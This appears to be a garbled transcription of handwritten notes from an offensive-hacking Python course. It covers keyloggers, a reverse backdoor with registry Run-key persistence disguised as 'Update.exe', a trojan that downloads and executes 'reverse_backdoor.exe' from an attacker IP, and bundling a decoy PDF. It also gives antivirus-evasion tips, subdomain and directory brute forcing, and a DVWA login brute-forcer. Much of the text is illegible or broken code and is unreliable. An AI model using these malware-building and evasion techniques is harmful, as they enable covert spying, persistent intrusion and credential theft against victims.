+Python Interpreter on Linux **Page Header**: Page 94 of 160 (date grid). **Main
+Content**: - *24) Installing Windows Python Interpreter on Linux:* - > Packaging
+Programs for Windows on Linux: - for best result package the program from the
+same operating system on the target - L) but if program from a windows computer
+- L) with a python interpreter - > So far windows python interpreter on Linux -
+(Wine it to: Convert python programs to executables) - *Note: Wine is a program
+which let us run windows executable in Linux* - L) wine create a virtual
+location (for C drive as in windows) - L) In Kali if you go in file manager
+select show hidden file you see drive-C wine and inside that you will see all
+program: "win" = (inside) that you see all - L) drive-C in wine = drive C (in
+windows): - 1) from google download python windows installer - i.e python.msi -
+2) wine python.msi - L) to install quick program **Annotations/Highlights**: -
+Yellow highlight on "for best result package... same operating system". - Green
+highlight on Wine note and drive-C explanation. #### Step 3: Page 95 - Wine
+Drive and Python in Virtual Environment **Page Header**: Page 95 (bottom right).
+**Main Content**: - *24) It will install python in - wine, drive-c python* - 4)
+We well import pyinstaller inside virtual windows - 5) C:\wine\drive\c\python\:
+- > wine python.exe -m pip install pyinstaller- - wine is a program to execute
+windows executable inside Linux - [*Note: for Kali to get full stay up to date*]
+- [*illegible*: transccrbe jupyter kernel white*] - [*illegible*: (several lines
+on Kali updates and installations*)] - [*Note: If you install python on Kali
+Linux it will not be installed in Kali windows virtual environment*] - [*Note:
+above is to install quick program*] **Annotations/Highlights**: - Yellow
+highlight on "wine python.exe -m pip install pyinstaller". - Green highlight on
+"wine is a program... inside Linux". #### Step 4: Page 96 - Packaging Programs
+for Windows from Linux **Page Header**: Page 96 (bottom right). **Main
+Content**: - *24) Packaging programs for windows from Linux* - L) We will try to
+convert exe to keylogger - Trouble of packaging is: all the Py2 library - code
+must be installed on a hacker computer or computers from which you are packaging
+- L) Py2 doesn't come preinstalled in Kali computer, install - L) to install Py2
+inside Kali but it us not installed - in Kali windows virtual environment - >
+wine root\winedrive\c\python\script\wine mail.exe - L) to install Py2 inside
+Kali virtual drive C - its when it comes to packaging files which uses multiple
+file - Eg our keylogger program has two file -> is keylogger.py - ii) Zlogger.py
+- L) So we will package that file which code of - Eg Zlogger file runs all the
+code of keylogger - L) we will package Zlogger file from terminal - *F5) we run
+keylogging keylogger from terminal - Eg python Zlogger.py -> To run of keylog:*
+**Annotations/Highlights**: - Yellow highlight on "Py2 doesn't come
+preinstalled...". - Green highlight on packaging multiple files note. #### Step
+5: Page 97 - To Run Windows Exe (Keylogger.exe Location) **Page Header**: Page
+97 (bottom right). **Main Content**: - > To run windows exe - [*Note: for
+keyloggers to rust: you gmail less-secure-apps*] - [*illegible*: must be switch
+on: you gmail less secure apps*] - [*illegible*: (several lines on Gmail
+settings and app passwords*)] - [*illegible*: 16/08/2024 for 14:21 DMHY (Y)
+(illegible math?)*] - [*Note: one way of both ribach order might*] - (1 808917
+3421 DMHY (Y) (illegible) - -now/then/that/Y/might) **Annotations/Highlights**:
+- Yellow highlight on "for keyloggers... less-secure-apps". - Green underline on
+Gmail note (illegible parts noted). #### Step 6: Page 98 - Persistence Idea
+(Registry Entries) **Page Header**: Page 98 of 160 (date grid). **Main
+Content**: - *6) Persistence Idea:* - L) Persistence programs start when the
+system boots - i) backdoors -> maintain our access - ii) keylogs -> spy on
+target - iii) reporters -> send report on target - . . . etc - L) we will add
+registry value inside, Resident: - L) Steps: - 1) windows if you open regedit
+and type go favol - > Computer\HKEY_CURRENT_USER\Software\Microsoft\ -
+Windows\CurrentVersion\Run: - L) You will see There are few entry in which, one
+of them is OneDrive. - L) That's why OneDrive run in background on system start
+- New if any how we add a new exe code inside seen - that exe will run on system
+start - ii) Run Comd In administrative mode and type - reg add /? -> To get help
+regstry **Annotations/Highlights**: - Yellow highlight on "Persistence programs
+start when the system boots". - Green highlight on Run key path. #### Step 7:
+Page 99 - Reg Add Command (HKCU Software Run) **Page Header**: Page 99 (bottom
+right). **Main Content**: - > Location where window put file to run on system
+start: - (1) reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run -
+[*Note: To specify name of our entry*] - L) /v test /t REG_SZ /d "C:\test.exe" -
+[*Note: of data of exe location: .exe*] - [*Default type of entry all entry has
+same type*] - L) Now if you fit entry and reload file you will - for a new entry
+with name test and its location from - where It will run If there is file inside
+c:\test.exe - It will run with system start: even if user restart - the computer
+our backdoor will run. - *3) If you want to delete this entry,* - L) light click
+on Name -> test right from - L) And click on Delete - L) from python file
+through subprocess module we can add registry entry. **Annotations/Highlights**:
+- Yellow highlight on reg add command. - Green highlight on "to delete this
+entry". #### Step 8: Page 100 - Running Program on Flasky (Connection Problems)
+**Page Header**: Page 100 (bottom right). **Main Content**: - *25) Running
+program on Flasky:* - L) Note: Those AV two problem - 1) If you run backdoor.exe
+without using - incoming connection in victim computer - backdoor will give
+error like failed to execute type - L) this error is because off that (cant
+serve-backdoor) - 2) for registry entry if you gave a location which: - L) eg
+"c:\download\backdoor.exe" and victim moves the backdoor from download -
+directory to some where else: the wrong entry - in registry will get added which
+will give - error to victim on system start - L) 2nd problem can be easily solve
+by making a copy - of our exe to somewhere else: dont loving at it eg+ temp
+victim cant go - Appdata directory because after data a hidden - folder inside
+C: - *1st way to solve problem-1:* **Annotations/Highlights**: - Yellow
+highlight on "If you run backdoor.exe without...". - Green highlight on registry
+entry problem. #### Step 9: Page 101 - Way to Solve 1st Problem (Code Inside
+Backdoors.py) **Page Header**: Page 101 of 160 (date grid). **Main Content**: -
+> Way to solve, 1st problem: - > Code inside backdoors.py - 1) Import win32api,
+os, json, shutil, sys - 2) class Backdoor: - def __init__(self, self, ip, port):
+... - : { code are dame } - my_backdoor = Backdoor("10.0.2.16", 4444) -
+my_backdoor.run() - except my_backdoor.run() - except sys.exit() - : (if
+listener is not found it will except that exception and it will silent exit it)
+- *# way to solve 2nd problem* - In python module to copy file us "shutil"
+library os produce - python to get location of appdata - i.e ->
+os.environ["APPDATA"] - L) (nature) of appdata is different for different user -
+L) because location name depend on user name - [*Note: Appdata depend on user*]
+**Annotations/Highlights**: - Yellow highlight on try-except sys.exit(). - Green
+highlight on "os.environ['APPDATA']". #### Step 10: Page 102 - Condition to Add
+Evil File (Become Persistent Function) **Page Header**: Page 102 (bottom right).
+**Main Content**: - > No snake function inside backdoors.py file: - import
+subprocess, json, os, base64, sys, shutil - 3) class Backdoor: ... - def
+__init__(self, self, ip, port): -> we called this method - self.connection = ...
+- self.connection.connect((ip,port)) (connection get established - and add to
+registry value - 3) def become_persistent(self): - evil_file_location =
+os.environ['APPDATA'] + "\\Windows\\Update.exe" - if not
+os.path.exists(evil_file_location): - shutil.copy(sys.executable,
+evil_file_location) - # many this executable - subprocess.call('reg add', "/f" +
+'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate' + ' /v
+Update /t REG_SZ /d "' + evil_file_location + '"', shell=True) - # If condition
+to add evil file - # part of appdata: - # because windows separate files with
+double flash: - # name of our (evil file) - [*Note: evil file location must be
+inside double quote to add it to registry because it is a way in window*]
+**Annotations/Highlights**: - Yellow highlight on "if not os.path.exists...". -
+Green highlight on subprocess.call reg add. #### Step 1: Page 103 - Creating a
+Basic Trojan Using Steganography **Page Header**: Page 103 (bottom right, date
+grid: Mon Tue Wed Thu Fri Sat Sun). **Main Content**: - *13) Creating a Basic
+Trojan using Steganography* - > Trojans: - - L) A trojan is a file that looks
+and functions as a normal file (image, pdf, song) . . . etc - i) when executed:
+the normal file that eyes expects - ii) executes evil code in the background
+(keyloggers, etc) - > Conceal & Execute: - L) Generic executables that download
+& execute files - Ideas: - - i) download backdoors + keyloggers: - ii) download
+keyloggers + password recovery tool - iii) download keylogger + password
+recovery tool + backdoor, - iv) using it as a trojan - evil file + normal file:
+- L) we are going to do: - 1) download a pdf )> open pdf )> download evil file -
+4) Run the evil file **Annotations/Highlights**: - Yellow highlight on "A trojan
+is a file that looks...". - Green highlight on "Ideas: i-iv" list. #### Step 2:
+Page 104 - Code Module: Download and Execute **Page Header**: Page 104 (bottom
+right). **Main Content**: - > Code Module [Download and Execute.py] - 1) import
+requests, subprocess, os, tempfile - 2) def download_url(): - get_response =
+requests.get(url) - file_name = url.split("/")[-1] - with open(file_name, "wb")
+as out_file: - out_file.write(get_response.content) - temp_directory =
+tempfile.gettempdir() - 4) download("http://10.0.2.16/evil_file(.jar)") - 5)
+subprocess.Popen("*.jar", shell=True) - 7)
+download("http://10.0.2.16/reverse_backdoor.exe") - 8)
+subprocess.call("reverse_backdoor.exe", shell=True) - 9)
+os.remove("reverse_backdoor.exe") - L) # if @ the end of remove - L) both files
+- 6) *Note: gets requests has problem: with pyinstaller - so enimal requests to
+use small version of - L) pip uninstall requests - to enimal requests if other
+version - L) types of image (jpg) to exe from pyinstaller
+**Annotations/Highlights**: - Yellow highlight on "def download_url(): ...
+out_file.write(get_response.content)". - Green highlight on subprocess calls and
+os.remove. #### Step 3: Page 105 - Creating a Trojan by Embedding Files in
+Program Code **Page Header**: Page 105 of 160 (date grid). **Main Content**: -
+*9) Creating a Trojan by embedding files in program: code* - *Note: Problem of
+disadvantage:* - > Generic executable that downloads and - executes files: - >
+Disadvantage: - - i) victim needs internet: connection - ii) all files must be
+uploaded and accessible - via a direct url: - L) Easiest way that we are going
+to do slight nine - package (just pdf with evil file) - ii) Extract front file
+at run time: - iii) Run front file from evil code - *Note: At the time of
+packaging: in pyinstaller we have to give one more argument - i.e -> --add-data
+"fonts/seeks/sample.pdf:." - *Note: After location: you need to give location
+where - this pdf file: will be extracted in victim computer - L) x:/temp
+directory by some where else - L) (opt) means by default pyinstaller extract its
+file in temp - inside appdata in victim computers so (opt) means to extract
+param - on default location of pyinstaller: x= self directory of py
+**Annotations/Highlights**: - Yellow highlight on "--add-data
+'fonts/seeks/sample.pdf:.'". - Green highlight on "Disadvantage: i-ii" and
+extraction note. This extraction covers Pages 103-105, advancing from
+persistence to trojan/droppers and steganography basics. If you have more pages
+or want code snippets tested (e.g., via code_execution tool), let me know! ###
+Page 106 of 160: Packaging Backdoor.py - Adding Icon and Data - **Note:** If and
+its problem is done - i.e. i) package font file is done - ii) attach font file
+at run time - **For problem this run from backdoor.py file you need to give exe
+code** 1. Import socket, subprocess, json, os, base64, shutil 2. class Backdoor:
+... 3. file_name = sys.METAPATH + "sample.py" *(# This location of inside
+victim)* 4. subprocess.Popen(file_name, shell=True) *(→ open sample.py)* 5.
+my_backdoor = Backdoor("10.0.2.15", 4444) 6. my_backdoor.run() - **except:
+exit()** - **If you used subprocess** - Popen fu so that - it will not block -
+**# By [sys.METAPASS] we can extract this file** - **location because of which
+we put** - **default location [temp] in = add data (argument)** - **(opt) after
+[temp] icon with parallel hide py** - **New package the file with command** -
+**Note:** - wine [proof, wine " - one file - console visible = backdoor.py** -
+**obvious sample.py - one file** ### Page 107 of 160: #18 Bypassing Antivirus
+Programs - Techniques - **#18 Bypassing anti-virus program** - **How?** - **AV
+program detect virus, based on:** 1. **Code** → compares files to huge database
+- **of signatures** 2. **Behavior** → run file in a sandbox and - **analyse it**
+- **Note:** use our code obfuscation, encryption, etc. - **To make your evil
+code unique use useless** - **operation like, adding two numbers,** -
+**dividing, subtracting use loop over to loop** - **to make your code unique** -
+**Pure of code sleep in your program** - **Use obfuscation means obfuscation
+sequence** - **your variable to some weird name in your files** - **alphabet .
+etc** - **To hyper behavior method of antivirus evil code** - **i) run fuxed
+operations before your evil code with** - **ii) delay execution of your evil
+code to 10-15** - **so dolphins will think your code will** - **not to do any
+harm to system** ### Page 108 of 160: #17 Adding an Icon to Generated Executable
+- **#17 Adding an icon to generated executable** - **Download an icon from
+website Iconfinder** - **Note:** - to make icon size highest as possible - **on
+min icon size must be 128px** - **Note:** - also make download icon quality -
+**as higher as possible 512x512 all up** - **Your downloaded icon has png
+extension** - **and we need ico extension that is ico extension** - **we will
+have to convert png to ico extension** - **go → easyico.net is a website to
+convert png to** - **To add icon in your exe which you want to add** - **a
+argument in pyinstaller you will have to add** - **i.e -icon [path/
+download.png]** - **# part of your file:** - **wine [icon wine john c
+python/original pyinstaller.exe** - **- add-data "[path/download/sample.png]" -
+one file** - **- console visible = backdoor.py** - **Note:** - now make you will
+see your backdoor** - **with icon but if you make it extra large then size icon
+will be** - **perfect because we downloaded icon with highest** - **quality**
+### Page 109 of 160: #19 Converting Python Program for OSX - **#19 Converting
+python program for OSX** - **From OSX machine convert for OSX** - **pyinstaller,
+convert it to executable from** - **OSX pyinstaller all command are same** -
+**Note:** - linux and OSX has preinstalled python** - **Problem in linux is that
+if you convert your python** - **file to linux executable file only linux
+executable** - **don't run by double clicking the linux executable** - **Linux
+executable are run from terminal only** - **Note:** - so, best way is write your
+evil code for it** - **some useful program eg + make changes and convert you** -
+**to - linux executable to - terminal if target will see their** - **linux
+executable from terminal in background** - **mac address get changed. connect:
+so this way** - **will get your service suspicious** - **Forget will not feel
+suspicious** - **To convert python file to linux executable file** - **Command
+to run linux executable file** - **./linux executable file** ### Page 110 of
+160: #20 Writing a Web Crawler - Sending GET Request - **#20 Writing a web
+crawler** - **#15 Sending GET request to web server** - **Information gathering
+on website:** 1. IP address 2. Domain name info 3. Technologies used 4. Open
+websites on the same server 5. DNS records - **Crawling subdomains:** - **Domain
+before the actual domain name :** - **part of the main domain** - **Ex:
+subdomain.target.com | ie google.com with** - **mail.google.com** -
+**plus.google.com** - **Note:** we were as a normal user to find subdomain, we**
+- **go to webserver and test everything in fetch** - **so we will have domain
+exist or not** - **do we well have to write a guess program** - **which on
+communicate with browser to get** - **subdomain via python - to browse via
+python** ### Page 111 of 160: Code in Crawler.py - Basic GET Request - **Create
+a python file called crawler.py** - **Note:** - request library let us to send
+request left** 1. Import requests 2. url = "google.com" 3. get_response =
+requests.get(url) 4. print(get_response) - **Now from terminal if you run python
+crawler.py** - **you will see
+<Response [200]>
+  : 200 status code** - **means server is able to reply and complete any** -
+  **request with no issue** - **Note:** - if you give url which doesn't exist
+  the abc.go** - **it will give error requests the code entry and except** -
+  **so we will have to wrap the try and except** - **block:** 5. Import requests
+  6. url = "mail.google.com" 7. try: get_response = requests.get(url) 8.
+  print(get_response, ConnectionError: exception anything working: 9. except
+  request.exception: ConnectionError: except means if you get this print nothing
+  - **# pass - this pass** ### Page 112 of 160: #21 Discovering Subdomains -
+  Wordlist Approach - **Now with previous code of you pass correct url** - **you
+  will see 200 status code - And if you pass** - **wrong url you will see noting
+  on screen** - **due to pass statement in except block** - **#21 Discovering
+  subdomain** - **Note:** - for discovering subdomain we need a wordlist** -
+  **wordlist is simple text file, contain names of words** - **each at specific
+  line. what we will do with** - **python code (1) open wordlist.txt (2) read
+  this file** - **one line at a time** - **(3) each time trying this word as
+  subdomain with** - **target domain** - **Name technique we used for online
+  account cracking,** - **brute force of password, brute force of pin,
+  subdomain** - **subdomain.txt contain → mail** - **www,** - **etc** - **Max
+  can download your geon wordlist file for** - **subdomain from internet** ###
+  Page 113 of 160: Code in Crawler.py - Subdomain Enumeration with Wordlist -
+  **Code in crawler.py:** 1. Import requests 2. def request(url): - try: -
+  return requests.get(url) - except requests.exceptions.ConnectionError: - pass
+  3. with open("subdomain/wordlist.txt", "r") as wordlist_file: - for line in
+  wordlist_file: - print(line) - **test_url = line + target_url** -
+  **print(test_url)** - **After running above code you will see google.com** -
+  **in printed after word . and by default view line** - **and give - (opt)
+  after word so that it will become** - **mail.google.com** - **02
+  www.google.com . etc** - **erase the space by default view line and give -
+  (opt)** - **after word so, that it will become mail.google.com** ### Page 114
+  of 160: Continuation - Handling Responses in Subdomain Discovery - **Note:** -
+  In python there is special called strip() which** - **remove newline after
+  word** 1. Import requests 2. def request(url): ... 3. target_url =
+  "google.com" 4. with open("subdomain/wordlist.txt", "r") as wordlist_file: -
+  for line in wordlist_file: - test_url = line.strip() + "." + target_url -
+  print(test_url) - response = request(test_url) - if response: - print("[+]
+  Possible subdomain → " + test_url) - **After running above code you will see
+  google.com** - **in printed after word . and by default view line** - **and
+  give - (opt) after word so that it will become** - **mail.google.com** - **02
+  www.google.com . etc**’ ### Page 115 of 160: #22 Brute Force Subdomain
+  Enumeration - **#22 Brute force subdomain enumeration** 1. Import requests 2.
+  def request(url): ... 3. target_url = "google.com" 4. with
+  open("subdomain/wordlist.txt", "r") as wordlist_file: - for line in
+  wordlist_file: - test_url = line.strip() + "." + target_url - response =
+  request(test_url) - if response: - print("[+] Possible subdomain → " +
+  test_url) - **Note:** - some antivirus has program** - **check if antivirus
+  has some change in** - **system : is it going to make some change in** -
+  **registry** - **Advantage of sandbox is it can't run your file fit only to
+  file** - **so delay your evil code execution** - **Bypassing Antivirus program
+  process:** - **Try to upload and you pre to website (com website** - **by that
+  there antivirus doesn't send your file to antivirus but** - **Eg:** suppose
+  your work re evil file you** - **now many antivirus detect it . if again g
+  antivirus** - **detect it . means antivirus is not detecting your** - **evil
+  code it is detecting the library of python** - **from where this python file
+  in compiled to exe** - **Because detection 90% is based on library of python**
+  - **Note:** - above core - py2 which download upx file** - **value of
+  pyinstaller from github download upx file** #### Step 1: Page 115 - Code in
+  Crawler.py (Requests and Wordlist Loop) **Page Header**: Page 115 of 160 (date
+  grid: Mon Tue Wed Thu Fri Sat Sun). **Main Content**: - > Code in Crawler.py -
+  1) import requests - 2) def request_url(url): ... - 3) target_url =
+  "google.com" - 4) with open("root/downloads/subdomain.txt", "r") as
+  wordlist_file: - for line in wordlist_file: - word = line.strip() # to remove
+  new line - test_url = target_url + "." + word - response = requests(test_url)
+  - 5) # print(test_url) for testing - 6) response = requests.get(test_url) - 7)
+  if response: - print(f"[+] Discovered the subdomain -> {test_url}") - else: -
+  pass - # means if we get request url then pass - # # all code are skipped
+  while if subdomain.txt is open - # will be executed while - # if open
+  **Annotations/Highlights**: - Yellow highlight on "word = line.strip()". -
+  Green highlight on if response: print... else: pass. #### Step 2: Page 116 -
+  Discovering Hidden Paths in Websites (Crawling Directories) **Page Header**:
+  Page 116 of 160 (date grid). **Main Content**: - *25) Discovering hidden paths
+  in websites:* - > Crawling directories: - - L) Directories/folders inside the
+  web root - L) can contain files or other directories - e.g.:
+  target.com/directory - e.g.: plus google.com/discover - *Note: Directories is:
+  crawling that you see out after 1st forwardslash: it's a directory inside -
+  that webroot?* - *# Note-0 -> we need a wordlist for brute forcing -
+  directories if you can get that wordlist for - AV called dirb eg: your got a
+  wordlist - Common.txt* - L) just like we used for forwardslash if this - using
+  must less resource tp get more hit **Annotations/Highlights**: - Yellow
+  highlight on "Crawling directories: ... can contain files or other
+  directories". - Green highlight on wordlist note. #### Step 3: Page 117 -
+  [Partial/Overlapping; Consolidated with Page 116] **Page Header**: Page 117
+  (bottom right; appears as extension of crawling notes). **Main Content**: -
+  [*illegible*: several lines on resource usage and hits, e.g., "using must less
+  resource tp get more hit"*] - [*Note: (repeated from prior on dirb wordlist
+  and common.txt)*] **Annotations/Highlights**: - Yellow highlight on resource
+  comparison. #### Step 4: Page 118 - Code Inside Subdomain-Crawler.py (Request
+  Function) **Page Header**: Page 118 (bottom right). **Main Content**: - > Code
+  inside subdomain-crawler.py - 1) import requests - 2) def request_url(url):
+  ... - try: - return requests.get("http://" + url) - except
+  requests.exceptions.ConnectionError: - pass - 3) target_url =
+  "10.0.2.16/multidae" - 4) with open("root/downloads/common.txt", "r") as
+  wordlist_file: - for line in wordlist_file: - word = line.strip() + "/" -
+  test_url = target_url + word - response = request_url(test_url) - if response:
+  - print(f"[+] Discovered the URL -> {test_url}") - else: - pass
+  **Annotations/Highlights**: - Yellow highlight on "def request_url(url): ...
+  pass". - Green highlight on if response: print... else: pass. #### Step 5:
+  Page 119 - Reading Response Content (Summary) **Page Header**: Page 119
+  (bottom right). **Main Content**: - *14) Reading response content:* - L)
+  Summary that we have done so far: - L) our crawler so, has an guess: - i)
+  Subdomains: - ii) Directories: - iii) files: - L) Advantages: - - L) Can
+  discovers, "hidden" paths/admin - does not want (us) to know = info leak - L)
+  Disadvantage: will not discover everything single - L) Solution: - - L)
+  Analyse discovered paths to discover more paths- - now, we are going to access
+  links on website - so, for that from python code we will try to load - the
+  html code of that website **Annotations/Highlights**: - Yellow highlight on
+  "Advantages: ... Can discovers 'hidden' paths". - Green highlight on
+  "Solution: ... Analyse discovered paths". #### Step 6: Page 120 - Code Inside
+  Spider.py (Print Response Content) **Page Header**: Page 120 (bottom right).
+  **Main Content**: - > Code inside Spider.py - 1) import requests - 2) def
+  request_url(url): ... - 3) target_url = "security.org" - 4) response =
+  requests(target_url) - 5) # print(response) -> # if we show 200 line code:
+  info - 6) print(response.content) -> # will shows all the html codes and -
+  link of website: i.e security.org **Annotations/Highlights**: - Yellow
+  highlight on "print(response.content)". - Green underline on "will shows all
+  the html codes and link". #### Step 7: Page 121 - Extracting Useful Data from
+  Response (Regex Links) **Page Header**: Page 121 of 160 (date grid). **Main
+  Content**: - *15) Extracting useful data from Response: - - L) we will use
+  regex to extract ca href: -> - we will extract links from html code - L) You
+  can, go on, website called python regex to - that website try from regex
+  method to extract links - 1) import requests - 2) import re # for regex - 3)
+  def get_response_from_url(url): ... - 4) target_url = "security.org" - 5)
+  response = requests(target_url) - 6) href_links =
+  re.findall(r'href=[\'"]?[^\'" >]+', response.content) - 7) print(href_links)
+  **Annotations/Highlights**: - Yellow highlight on "we will use regex to
+  extract ca href". - Green highlight on re.findall regex pattern. #### Step 8:
+  Page 122 - Code to Convert Relative Links to Full URLs **Page Header**: Page
+  122 (bottom right). **Main Content**: - > Code to convert relative links to
+  full urls: - 1) import requests - 2) import re # module to convert relative
+  link to full - 3) target_url = "https://security.org" - 4) def
+  extract_links_from_url(url): ... - 5) href_links =
+  extract_links_from(target_url) - 6) for link in href_links: - url_link =
+  urllib.parse.urljoin(target_url, link) - if target_url in url_link: -
+  target_links.append(link) - target_links.append(link) - print(link) - L) from
+  above code you will get link like: - L) https://security.org/faq - L)
+  https://security.org/contact * etc. **Annotations/Highlights**: - Yellow
+  highlight on "for link in href_links: ... if target_url in url_link". - Green
+  highlight on "from above code you will get link like". #### Step 9: Page 123 -
+  Code in Crawler.py (Every Link as Full) **Page Header**: Page 123 (bottom
+  right). **Main Content**: - > Code in Crawler.py - 1) import requests - 2)
+  import re, urlparse - 3) target_url = "https://security.org/products/" - 4)
+  target_links = [] # To connect all links as list by placing - 5) def
+  extract_links_from(url): ... - 6) href_links = extract_links_from(target_url)
+  - 7) for link in href_links: - url_link = urlparse.urljoin(target_url, link) -
+  if target_url in url_link: - target_links.append(link) - 8) print(link) - >
+  New above code will only find unique links - and will not repeat the links
+  **Annotations/Highlights**: - Yellow highlight on "target_links = []". - Green
+  highlight on "New above code will only find unique links". #### Step 10: Page
+  124 - Extracting Unique Titles of HTML (Problem with Repeated Links) **Page
+  Header**: Page 124 of 160 (date grid). **Main Content**: - *16) Extracting
+  unique titles of HTML* - 1) to Note: problem with our code that - repeated in
+  our code because of collage of writes - we will try to convert all the link as
+  direct access - Third problem is if you see html code of website - some
+  problem us of you see html code of website - let states: stay in fact one page
+  to redirect to client to tab. additional info in the same page it not show -
+  That part: type info link you will see your link get - repeated
+  https://security.org/products/# reviews : - L) https://security.org/med/# tab
+  description : - L) This part remain some in link and after - that something
+  changes - L) so, we will have to add And condition code - to repeat this type
+  of link - not to repeat this type of link with **Annotations/Highlights**: -
+  Yellow highlight on "problem with our code that repeated...". - Green
+  highlight on example repeated links. ` **Page Header**: Page 125 (bottom
+  right, date grid: Mon Tue Wed Thu Fri Sat Sun). **Main Content**: - > Code in
+  Crawler.py - 1) import requests - 2) import re, urlparse - 3) target_url =
+  "https://security.org/products/" - 4) target_links = [] # To connect all links
+  as list by placing - 5) def extract_links_from(url): ... - 6) href_links =
+  extract_links_from(target_url) - 7) for link in href_links: - url_link =
+  urlparse.urljoin(target_url, link) - if target_url in url_link: -
+  target_links.append(link) - 8) print(link) - > New above code will only find
+  unique links - and will not repeat the links - [*Note: To ensure no
+  duplicates, use a set for target_links instead of list: target_links = set()
+  ... target_links.add(link) ... then convert to list if needed*] - L) This
+  prevents repetition from HTML fragments like /#reviews or /tab-description
+  **Annotations/Highlights**: - Yellow highlight on "target_links = [] # To
+  connect all links as list". - Green highlight on "New above code will only
+  find unique links and will not repeat the links". - Red underline on set()
+  suggestion for deduplication. ### Page 125 of 160 **#1 Recursively overserving
+  url path on a target website** **So, far we have done: -** **Goal ->
+  Recursively hit all links from** 1) Read page html 2) Extract all links 3)
+  Repeat for each new url that is not already in the list. Every time is one
+  level+ **In previous code one, we provide the links** In https://example.org
+  our code will show all But we want our code most go inside Every link and find
+  more directory parent inside the link **Eg ->** on security website where you
+  will see Home tabs, courses, .. etc if you go inside courses you will see more
+  links like we would something like this. So, that keep going inside every link
+  and keep on going until all words from passwordlist end by the Wordlist ###
+  Page 126 of 160 **Code inside sframes.py** 1) Import sequins, se urlparse
+  target_url = "https://0.0.2.0/multillidae/" target_links = [] def
+  extract_links_from(url): ... def crawl(url): href_links =
+  extract_links_from(url) for link in href_links: link = urlparse(urljoin(url,
+  link)) if "#" in link: link = link.split("#")[0] if target_url in link and
+  link not in target_links: target_links.append(link) print(link)
+  crawl(target_url) **-> If again called the function crawl(), means if you**
+  **go inside some unique link will again your brute forcing** **go inside
+  crawl() so that it will keep moving inside via** **wordlist and keep link
+  inside leaves and the links.** **So, that it will crawl all** ### Page 127 of
+  160 (Continuation of crawl code from page 126) crawl(target_url) (Highlighted
+  note on recursive call as above) ### Page 128 of 160 **#18 Writing A program
+  to** **Given login Information** **#15 Sending post request to website.** In
+  previous code we use using Get method to Get Communicate with website by
+  requests.get() method But to communicate with input boxes you will have to use
+  post method in request library GET method is used for submitting form... etc.
+  So if we can Come to knows how to deal with post method on python we can also
+  make Brute forcing tool. ... etc. **Note:** You need form url where it get
+  submitted and you will get form url by right clicking on website, Inspect
+  elements <form action="login.php"? ## This is form url where form is get
+  submitted 1) were login.php is a example may be for some link well be
+  different in your case 2) And one thing to note "form method" is post In that
+  form code is written like this:
+  <form action="login.php" method="post">
+    <input class="loginInput" name="username" />
+    <input ... name="password" />
+
+    ### Page 129 of 160 **Code in post.py** 1) Import requests 2) target_url =
+    "https://0.0.2.0/dvwa/login.php" 3) data_dict = {"username": "admin",
+    "password": "password", "Login": "Login"} (If we took it as a dictionary
+    with key value pair with username corresponding to admin and password
+    corresponding to pass **Note:** we use for username = "user name" cause in
+    similarly coding in password name = "pass" If name field is different in
+    your case you will know to use that name field (Notes:) **Note:** In button
+    "Login" is used type as value op 4) response = requests.post(target_url,
+    data=data_dict) ( for Login because in this python code we for because in
+    url = post 5) print(response.text) # after you run this python code from
+    personal you well see of website in terminal. and So that code fail
+    <div class="message">Login failed</div>
+
+    **By Default DVWA username is admin and password is password** and if you
+    give above credential you will see Login successful ### Page 130 of 160
+    **#19 Writing a Vulnerability Scanner** **#15 Introduction & Tools :-**
+    **DVWA HTTP Request - post vs Get :-** > HTTP Requests - since Information +
+    When user clicks on a link browser generate a request (client side) iii)
+    Request is sent to the server iv) Server perform the request(server-side)
+    send Response back. **Note:** In hacking we try to manipulate request and
+    response to see how website respond. **#16 HTTP Requests - Get vs Post:**
+    Two main methods used to send data to the web application: 1) Through the
+    url (usually ending ?) a) http://website.com/news.php?id=1 ( ? is a file of
+    php parameter b) http://website.com?id=1 without file name 5) Value -> Try
+    to manipulate the value and see what response you get ### Page 131 of 160
+    **#17 Guessing login information on login pages :-** 1) For brute forcing
+    you need a wordlist file of password . By -> you wordlist file 2) Import
+    requests 3) target_url = "https://0.0.2.0/dvwa/login.php" 4) data_dict =
+    {"username": "admin", "password": "pass"} (We left password empty so that
+    send password from wordlist 5) with open("rockyou.txt", "r") as word_list:
+    for line in word_list: word = line.strip() data_dict["password"] = word #
+    access dictionary # key password 6) response = requests.post(target_url,
+    data=data_dict) if "login failed" not in response.content: print("It's Get
+    the password ->" + word) exit() 5) print(f"[+] Reached end of line") -> **##
+    if program mean** that case if statement wasn't found password so in that
+    case 5th statement will run ### Page 132 of 160 **#4 Extracting HTML
+    Attributes :-** Import sequins BeautifulSoup def parse(url): ... target_url
+    = "https://0.0.2.0/multillidae/index.php?page=" response =
+    request(target_url) parsed_html = BeautifulSoup(response, text) forms_list =
+    parsed_html.findAll("form") For form in forms_list: action =
+    form.get("action") # to get action url print(action) method =
+    form.get("method") # to get method print(method) input_list =
+    form.findAll("input") ie to access input element For input in input_list:
+    input_name = input.get("name") input_type = input.get("type")
+    print(input_name) ### Page 133 of 160 (Continuation of form extraction from
+    page 132) For form in forms_list: action = form.get("action") # to get
+    action url print(action) method = form.get("method") # to get method
+    print(method) input_list = form.findAll("input") ie to access input element
+    For input in input_list: input_name = input.get("name") input_type =
+    input.get("type") print(input_name) (Notes on accessing input:) # To access
+    input inside input name = type **#5 Posting form :-** To submit form in html
+    action url But to submit it through python code we want full action url ie
+    action = "https://0.0.2.0/index.php" You can do that manually :) but then
+    you will have to check if url is full or relative ul then do this ... if url
+    is relative But best way is to avoid all above problem in python there is
+    module called urlparse which do all above check for us.
+    **urlparse(url).geturl() == url** then do (if) ... (Partial code snippet at
+    bottom) ### Page 134 of 160 **#5 Posting form :-** (Continuation) To submit
+    form in html action url given in the html page is relative url eg
+    action="index.php" But to submit it through python code we want full action
+    url ie action="https://0.0.2.0/index.php" You can do that manually :) but
+    then you will have to check if url is full or form this condition if url is
+    relative ul then do this ... if url is relative But best way is to avoid all
+    above problem in python there is module called urlparse which do all above
+    check for us. which do all above check (base) urlparse statement .. or
+    **urlparse(url).geturl() == url** then do (if) ... (Partial code at bottom:
+    if "http" in urlparse... etc.) ### Page 135 of 160 **Code inside
+    Extract_form.py** 1) Import requests, BeautifulSoup, urlparse 2) target_url
+    = "https://0.0.2.0/multidae/index.php?page=" 3) response =
+    request(target_url) 4) parsed_html = BeautifulSoup(response.content) 5)
+    forms_list = parsed_html.findAll("form") 6) For form in forms_list: action =
